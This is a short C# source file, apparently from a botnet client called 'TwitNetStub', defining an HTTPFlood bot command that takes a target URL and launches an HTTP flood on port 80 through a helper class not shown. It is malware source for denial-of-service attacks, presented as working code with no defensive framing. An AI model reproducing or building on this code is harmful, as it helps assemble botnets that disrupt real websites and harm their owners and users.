using System;
using System.Collections.Generic;
using System.Text;
using TwitNetStub.Util.Network;

namespace TwitNetStub.Commands
{
    class HTTPFlood : IBotOperation
    {
        private string MainURL;
        private int Port;
        private int Threads;

        public HTTPFlood (string url)
        {
            MainURL = url;
        }
        public void Initialize()
        {
           Port = 80;
           Threads = 1; 
        }
        public void Run()
        {
            HTTP.sFHost = MainURL;
            HTTP.Port = Port;
            HTTP.iThreads = Threads;
            HTTP.StartHTTPFlood();
        }
    }
}
